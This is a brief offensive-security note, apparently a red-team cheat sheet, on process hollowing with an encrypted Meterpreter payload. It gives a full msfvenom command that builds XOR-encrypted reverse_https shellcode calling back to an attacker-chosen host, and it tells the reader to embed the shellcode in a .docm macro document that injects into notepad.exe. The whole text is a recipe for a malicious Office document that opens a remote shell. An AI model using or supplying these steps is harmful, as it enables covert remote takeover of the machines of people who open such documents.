# Process Hollowing

## Encrypted Meterpreter

### 1) Create shellcode

    # If you change the key, then change it in the vba code too
    msfvenom -p windows/meterpreter/reverse_https LHOST=[LHOST] LPORT=[LPORT] EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key 'CHANGEMYKEY'

### 2) Create a new Macro file

Insert your shellcode from step above and save the file as a .docm, in this case it will inject into notepad.exe but you can change this
